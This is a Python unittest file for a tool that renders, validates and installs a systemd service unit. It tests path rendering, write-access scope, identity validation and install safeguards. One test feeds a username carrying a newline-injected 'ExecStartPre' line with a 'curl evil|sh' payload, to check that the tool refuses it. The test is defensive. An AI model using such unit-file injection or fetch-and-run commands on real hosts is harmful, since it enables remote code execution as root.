"""The supervisor unit must be rendered, verified and installed, never hand-edited."""
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
import install_server

ROOT=Path(install_server.__file__).resolve().parent.parent
TRACKED=ROOT/'docs'/'evidence'/'supervisor-unit.json'


def result(returncode=0,stdout=''):
    return type('R',(),{'returncode':returncode,'stdout':stdout,'stderr':''})()


class RenderingTests(unittest.TestCase):
    def render(self,**overrides):
        values={'root':ROOT,'home':Path('/srv/sbarbase'),'user':'sbarbase','bun_dir':'/srv/sbarbase/.bun/bin'}
        values.update(overrides)
        return install_server.rendered_unit(values['root'],values['home'],values['user'],values['bun_dir'])

    def test_every_shipped_default_path_is_replaced(self):
        rendered=self.render()
        self.assertNotIn('/opt/sbarbase',rendered)
        self.assertIn('WorkingDirectory='+str(ROOT),rendered)
        self.assertIn('ExecStart=/usr/bin/python3 '+str(ROOT)+'/lab/dev.py',rendered)
        self.assertIn('ExecStartPre=/usr/bin/python3 '+str(ROOT)+'/lab/install_server.py check',rendered)
        self.assertIn('ReadWritePaths='+str(ROOT)+'\n',rendered)
        self.assertIn('Environment=HOME=/srv/sbarbase',rendered)
        self.assertIn(':/srv/sbarbase/.bun/bin',rendered)

    def test_the_shipped_default_layout_renders(self):
        """/opt/sbarbase is the layout the shipped unit already names; rendering it
        must work rather than trip over its own anchors."""
        rendered=install_server.rendered_unit(Path('/opt/sbarbase'),Path('/home/sbarbase'),'sbarbase','/home/sbarbase/.bun/bin')
        self.assertIn('WorkingDirectory=/opt/sbarbase',rendered)
        self.assertIn('ReadWritePaths=/opt/sbarbase',rendered)
        self.assertIn('ExecStart=/usr/bin/python3 /opt/sbarbase/lab/dev.py',rendered)
        self.assertIn('Documentation=file:/opt/sbarbase/docs/guides/server-deployment.md',rendered)

    def test_a_unit_whose_shape_changed_is_not_rewritten_blindly(self):
        broken=install_server.SERVICE_UNIT.read_text().replace('ExecStart=/usr/bin/python3 /opt/sbarbase/lab/dev.py','ExecStart=/bin/true')
        with self.assertRaises(SystemExit):
            install_server.rendered_unit(ROOT,Path('/srv/x'),'sbarbase','/srv/x/.bun/bin',text=broken)

    def test_a_missing_bun_directory_is_refused(self):
        with self.assertRaises(SystemExit):
            install_server.rendered_unit(ROOT,Path('/srv/x'),'sbarbase','')

    def test_the_service_user_is_applied(self):
        rendered=self.render(user='supabase-ops')
        self.assertIn('User=supabase-ops',rendered)
        self.assertIn('Group=supabase-ops',rendered)
        self.assertNotIn('User=sbarbase',rendered)

    def test_the_install_commands_name_the_rendered_file_not_a_placeholder(self):
        rendered_path=ROOT/'.lab'/'rendered-sbarbase.service'
        commands=install_server.unit_commands(rendered_path)
        self.assertEqual(len(commands),4)
        self.assertIn('install -m 0644 '+str(rendered_path),commands[0])
        self.assertNotIn('<rendered unit>',commands[0])
        self.assertIn('/etc/systemd/system/sbarbase.service',commands[0])
        self.assertIn('daemon-reload',commands[1])
        self.assertIn('enable --now sbarbase.service',commands[2])
        self.assertIn('is-active',commands[3])


class WriteAccessTests(unittest.TestCase):
    """A ReadWritePaths entry for a missing directory fails the unit with 226/NAMESPACE."""

    def rendered(self,**overrides):
        values={'root':ROOT,'home':Path('/srv/sbarbase'),'user':'sbarbase','bun_dir':'/srv/sbarbase/.bun/bin'}
        values.update(overrides)
        return install_server.rendered_unit(values['root'],values['home'],values['user'],values['bun_dir'])

    def paths(self,rendered):
        line=[item for item in rendered.splitlines() if item.startswith('ReadWritePaths=')][0]
        return line.split('=',1)[1].split()

    def test_write_access_is_granted_only_inside_the_checkout(self):
        root=Path('/srv/sbarbase')
        paths=self.paths(self.rendered(root=root))
        self.assertEqual(paths,[str(root)])
        for path in paths:
            self.assertTrue(Path(path)==root or root in Path(path).parents,path+' is outside the checkout')

    def test_the_installation_keeps_its_secrets_under_the_checkout(self):
        self.assertEqual(install_server.PRIVATE,ROOT/'.secrets'/'upstream')
        self.assertIn(str(ROOT),str(install_server.PRIVATE))

    def test_no_rendered_unit_demands_a_path_outside_the_repository(self):
        for home in (Path('/srv/sbarbase'),Path('/home/sbarbase')):
            with self.subTest(home=home):
                for path in self.paths(self.rendered(home=home)):
                    self.assertEqual(Path(path),ROOT)


class IdentityValidationTests(unittest.TestCase):
    """Values from argv are written into a root-owned unit: they must be validated."""

    def test_a_service_user_with_a_newline_is_refused(self):
        with self.assertRaises(SystemExit) as raised:
            install_server.rendered_unit(ROOT,Path('/srv/x'),'sbarbase\nExecStartPre=/bin/sh -c "curl evil|sh"','/srv/x/.bun/bin')
        self.assertIn('plain account name',str(raised.exception))

    def test_a_relative_home_is_refused(self):
        with self.assertRaises(SystemExit):
            install_server.rendered_unit(ROOT,Path('relative'),'sbarbase','/srv/x/.bun/bin')

    def test_a_bun_directory_with_a_space_or_percent_is_refused(self):
        for value in ('/srv/x/.bun bin','/srv/%h/.bun/bin','/srv/x/.bun\\bin'):
            with self.subTest(value=value), self.assertRaises(SystemExit):
                install_server.rendered_unit(ROOT,Path('/srv/x'),'sbarbase',value)

    def test_valid_identities_pass(self):
        self.assertTrue(install_server.validate_service_identity('supabase-ops',Path('/srv/sbarbase'),'/srv/sbarbase/.bun/bin'))


class InstallGuardTests(unittest.TestCase):
    def evidence_path(self):
        directory=tempfile.TemporaryDirectory();self.addCleanup(directory.cleanup)
        return Path(directory.name)/'supervisor-unit.json'

    def test_installing_requires_root(self):
        with patch.object(install_server.os,'geteuid',return_value=1000), \
             patch.object(install_server,'account_exists',return_value=True), \
             patch.object(install_server,'run') as run:
            run.return_value=result()
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=True,evidence_path=self.evidence_path())
        self.assertIn('requires root',str(raised.exception))

    def test_a_unit_that_fails_verification_is_never_installed(self):
        with patch.object(install_server.os,'geteuid',return_value=0), \
             patch.object(install_server,'account_exists',return_value=True), \
             patch.object(install_server,'run') as run:
            run.return_value=result(1)
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=True,evidence_path=self.evidence_path())
            commands=[call.args[0][1] for call in run.call_args_list]
        self.assertIn('did not verify',str(raised.exception))
        self.assertFalse(any('install' in command[0] for command in commands),commands)

    def test_an_installed_unit_that_never_becomes_active_fails_the_run(self):
        def by_command(command,*,check=True):
            if command[0]=='systemctl' and command[1]=='is-active':return result(0,'inactive\n')
            return result(0,'')
        with patch.object(install_server.os,'geteuid',return_value=0), \
             patch.object(install_server,'account_exists',return_value=True), \
             patch.object(install_server,'run',side_effect=by_command):
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=True,evidence_path=self.evidence_path())
        self.assertIn('did not become active',str(raised.exception))

    def test_a_failing_install_step_is_reported_without_a_traceback(self):
        def by_command(command,*,check=True):
            if command[0]=='systemctl' and command[1]=='enable':return result(1)
            return result(0,'')
        with patch.object(install_server.os,'geteuid',return_value=0), \
             patch.object(install_server,'account_exists',return_value=True), \
             patch.object(install_server,'run',side_effect=by_command):
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=True,evidence_path=self.evidence_path())
        self.assertIn('installation step failed',str(raised.exception))

    def test_installing_for_an_account_that_does_not_exist_is_refused(self):
        with patch.object(install_server.os,'geteuid',return_value=0), \
             patch.object(install_server,'account_exists',return_value=False):
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=True,evidence_path=self.evidence_path())
        self.assertIn('does not exist on this host',str(raised.exception))
        self.assertIn('--service-user',str(raised.exception))

    def test_a_dry_run_for_a_missing_account_still_renders_and_says_so(self):
        target=self.evidence_path()
        with patch.object(install_server,'account_exists',return_value=False), \
             patch.object(install_server,'run') as verify:
            verify.return_value=result()
            self.assertTrue(install_server.supervise(apply=False,evidence_path=target))
        self.assertEqual(json.loads(target.read_text())['service_account'],'missing')

    def test_a_present_account_is_recorded(self):
        target=self.evidence_path()
        with patch.object(install_server,'account_exists',return_value=True), \
             patch.object(install_server,'run') as verify:
            verify.return_value=result()
            install_server.supervise(apply=False,evidence_path=target)
        self.assertEqual(json.loads(target.read_text())['service_account'],'present')

    def test_a_missing_bun_is_refused_instead_of_substituting_usr_bin(self):
        with patch.object(install_server.shutil,'which',return_value=None):
            with self.assertRaises(SystemExit) as raised:
                install_server.supervise(apply=False,evidence_path=self.evidence_path())
        self.assertIn('--bun-dir',str(raised.exception))

    def test_a_dry_run_writes_its_evidence_where_asked_and_touches_nothing_tracked(self):
        before=TRACKED.read_bytes()
        target=self.evidence_path()
        with patch.object(install_server,'run') as verify:
            verify.return_value=result()
            passed=install_server.supervise(apply=False,evidence_path=target)
        self.assertTrue(passed)
        self.assertEqual(TRACKED.read_bytes(),before,'the tracked evidence file must not be rewritten by a test')
        evidence=json.loads(target.read_text())
        self.assertEqual(evidence['verify'],'passed')
        self.assertFalse(evidence['applied'])
        self.assertFalse(evidence['running_as_root'])
        self.assertNotIn('/opt/sbarbase',evidence['rendered'])
        self.assertIn('Not a substitute for the server acceptance run',evidence['scope'])
        self.assertNotIn('<rendered unit>',evidence['install_commands'][0])
        self.assertIn(evidence['rendered_path'],evidence['install_commands'][0])


if __name__=='__main__':unittest.main()